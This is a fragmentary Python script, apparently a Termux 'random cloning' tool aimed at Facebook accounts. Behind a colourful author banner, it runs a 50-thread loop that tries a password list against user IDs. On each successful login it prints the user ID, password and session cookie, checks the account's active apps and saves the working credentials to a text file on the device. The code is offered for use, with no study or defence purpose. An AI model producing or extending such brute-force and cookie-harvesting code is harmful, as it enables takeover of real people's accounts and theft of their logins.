...
def cek_apk(session,coki):
    ...
    if len(game)==0:
        ...
        print(f'\r[] %s \x1b[1;95m  Your Active Apps      :{WHITE}'%(YELLOW))
...
ha = current.day
today = date.today()
os.system('xdg-open https://facebook.com/groups/966474445262512/')
logo = ("""
    
 \033[1;93m╔═════════════════[\033[1;32m 𝘼𝘿𝙈𝙄𝙉 𝙄𝙉-𝙁𝙍𝙊 \033[1;32m]══════════════╗
 \033[1;93m║     \033[1;96m[✓] CREATED BY\33[0;m   : \033[1;96m ZEXX+TEN'X    \033[1;32m║
 \033[1;93m║     \033[1;32m[✓] FACEBOK      : \033[1;34m TA HS IN      \033[1;32m║
 \033[1;93m║     \033[1;35m[✓] GITHUB       :  \033[1;35mTAHSIN-404       \033[1;32m ║
 \033[1;93m║     \033[1;36m[✓] TOOL STATUS  : \033[1;36m 𝑹𝒂𝒏𝒅𝒐𝒎 𝑪𝒍𝒐𝒏𝒊𝒏𝒈       \033[1;32m ║
 \033[1;93m║     \033[1;35m[✓] TEAM         :  \033[1;32    TERMUX-USER \033[1;32m ║
 ...
 \033[1;93m║  [\033[1;97m•\033[1;91m]\033[1;32m ZEXX+TEN'X....          \033[1;32m ║
 \033[1;93m╚═════════════════[\033[1;93m T.F.S \033[1;32m]══════════════╝""")
def linex():
	print('\033[1;93m ×××××××××××××××××××××××××××××××××××××××××××××××××')
loop = 0
oks = []
...
def riddu():
    ...
    with ThreadPool(max_workers=50) as manshera:
        ...
        print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;94m TOOL OWNER \033[1;97m: \033[1;96m ZEXX+TENX')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[ZEXX+TENX🍁] ' +uid+ ' | ' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/Zexx+Tenx.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s {x}[{xr}TFS{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
